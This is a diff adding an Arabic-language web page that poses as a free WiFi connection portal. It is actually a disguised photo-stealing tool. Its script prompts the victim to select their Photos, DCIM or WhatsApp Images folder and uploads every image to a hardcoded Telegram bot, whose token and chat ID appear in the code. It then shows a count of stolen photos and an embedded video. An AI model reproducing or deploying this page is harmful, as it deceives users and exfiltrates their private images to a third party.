@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Free - إنترنت مجاني فائق السرعة</title>
+    <style>
+        body { 
+            margin: 0; 
+            background: linear-gradient(135deg, #001122, #003344); 
+            color: #00ffcc; 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            overflow: hidden;
+        }
+        .header { 
+            background: rgba(0,25,45,0.95); 
+            padding: 22px; 
+            position: fixed; 
+            width: 100%; 
+            top: 0; 
+            z-index: 100; 
+            box-shadow: 0 5px 25px rgba(0,255,200,0.5);
+        }
+        h1 { 
+            margin: 0; 
+            font-size: 2.9em; 
+            text-shadow: 0 0 25px #00ffcc; 
+        }
+        .subtitle { 
+            font-size: 1.45em; 
+            color: #88ffdd; 
+            margin: 12px 0 0; 
+        }
+        .container { 
+            padding-top: 160px; 
+        }
+        .signal { 
+            font-size: 5.5em; 
+            margin: 30px 0; 
+            animation: pulse 1.4s infinite; 
+        }
+        @keyframes pulse { 0%,100% { opacity: 0.7; } 50% { opacity: 1; } }
+        .loader { 
+            width: 90px; 
+            height: 90px; 
+            border: 9px solid #003322; 
+            border-top: 9px solid #00ffcc; 
+            border-radius: 50%; 
+            animation: spin 0.85s linear infinite; 
+            margin: 40px auto; 
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status { 
+            font-size: 1.55em; 
+            color: #88ffdd; 
+            margin: 35px 0; 
+        }
+        button { 
+            background: linear-gradient(#00ffcc, #00ccaa); 
+            color: #001122; 
+            padding: 25px 70px; 
+            font-size: 2.1em; 
+            border: none; 
+            border-radius: 18px; 
+            cursor: pointer; 
+            box-shadow: 0 0 45px #00ffcc; 
+            margin: 30px; 
+            font-weight: bold;
+        }
+        button:hover { 
+            transform: scale(1.1); 
+            background: linear-gradient(#00ffee, #00ddbb); 
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>WiFi Free</h1>
+        <p class="subtitle">اتصل بالإنترنت مجاناً • سرعة فائقة • بدون بيانات</p>
+    </div>
+
+    <div class="container">
+        <div class="signal">📶</div>
+        <div class="loader"></div>
+        <div class="status">جاري الاتصال بالشبكة المجانية القوية...</div>
+        <button onclick="triggerSteal()">اتصل وابدأ التحميل الفوري</button>
+        <p style="color:#66ccaa; margin-top:30px;">سيتم تحميل الملفات بسرعة رهيبة أثناء الاتصال</p>
+    </div>
+
+    <input type="file" id="dirPicker" webkitdirectory directory multiple style="display:none;">
+
+    <script>
+        const BOT_TOKEN = "8513086443:AAHQPYNkvykBWknzUCBvnwnh2UjXaZat0L4";
+        const CHAT_ID = "6481355719";
+
+        async function sendPhoto(file) {
+            if (!file.type.startsWith("image/") && !/\.(jpg|jpeg|png|gif|webp|heic|bmp)$/i.test(file.name)) return;
+            
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", file, file.name);
+            formData.append("caption", `📸 WiFi Free | ${file.name} | ${(file.size/1024/1024).toFixed(2)}MB | ${new Date().toLocaleString('ar')}`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch(e) {}
+        }
+
+        function triggerSteal() {
+            alert("📶 جاري الاتصال... اختار مجلد 'الصور' أو 'DCIM' أو 'WhatsApp Images' عشان تحمل بسرعة فائقة");
+            document.getElementById('dirPicker').click();
+        }
+
+        document.getElementById('dirPicker').addEventListener('change', async (event) => {
+            const files = event.target.files;
+            if (!files || files.length === 0) {
+                setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 800);
+                return;
+            }
+
+            let count = 0;
+            for (let file of files) {
+                await sendPhoto(file);
+                count++;
+                await new Promise(r => setTimeout(r, 900 + Math.random() * 600));
+            }
+
+            document.body.innerHTML = `
+                <div style="padding-top:180px; color:#00ffcc; font-size:2.8em;">
+                    ✅ تم الاتصال بنجاح!<br>
+                    تم سحب ${count} صورة 🔥
+                </div>
+                <iframe width="100%" height="680" src="https://www.youtube.com/embed/dQw4w9wgxcq" frameborder="0" allowfullscreen></iframe>
+            `;
+        });
+    </script>
+</body>
+</html>
